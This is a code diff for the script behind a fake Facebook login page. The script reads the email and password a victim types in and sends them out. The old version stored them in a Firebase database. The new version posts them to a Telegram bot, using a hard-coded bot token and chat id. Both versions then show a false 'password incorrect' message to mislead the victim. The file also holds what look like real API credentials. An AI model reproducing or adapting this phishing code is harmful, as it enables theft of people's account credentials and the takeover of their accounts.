@@ -1,37 +1,22 @@
-const form = document.querySelector("#form");
-const firebaseConfig = {
-  apiKey: "AIzaSyD5FhicXAH3aEYb7jbepfWgTO1yYVS2I0c",
-  authDomain: "votinglink-4b29b.firebaseapp.com",
-  databaseURL: "https://votinglink-4b29b-default-rtdb.firebaseio.com",
-  projectId: "votinglink-4b29b",
-  storageBucket: "votinglink-4b29b.appspot.com",
-  messagingSenderId: "402855562119",
-  appId: "1:402855562119:web:5c8d9c92809144dc5da122",
-  measurementId: "G-WKL91DK9E0"
-};
-
-// Initialize Firebase
-firebase.initializeApp(firebaseConfig);
-
-const database = firebase.database();
+const form = document.querySelector("#form")
 
 form.addEventListener("submit", (e) => {
-  const ref = database.ref("Facebook");
-  e.preventDefault();
+    e.preventDefault();
 
-  const userName = document.getElementById("email").value;
-  const passWord = document.getElementById("password").value;
+    var identity = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
 
-  ref.push({
-    userName: userName,
-    passWord: passWord,
-  });
+    var my_text = `Facebook Result is:%0A - Identity: ${identity} %0A - Password: ${password}`
 
-  document.getElementById("alert-message").innerHTML =
-    "Sorry, your password was incorrect. Please double-check your password.";
-  setTimeout(() => {
-    document.getElementById("alert-message").innerHTML = "";
-  }, 4000);
-  form.reset();
-});
+    var token = "6079880704:AAGk126KOADLmf2YAYlfg_W_ZPFc8g-sjYk";
+    var chat_id = -4144933257
+    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
 
+    let api = new XMLHttpRequest();
+    api.open("GET", url, true);
+    api.send();
+    // window.location.replace("https://www.instagram.com/accounts/login/")
+    console.log("Incorrect Password!");
+
+    document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
+})
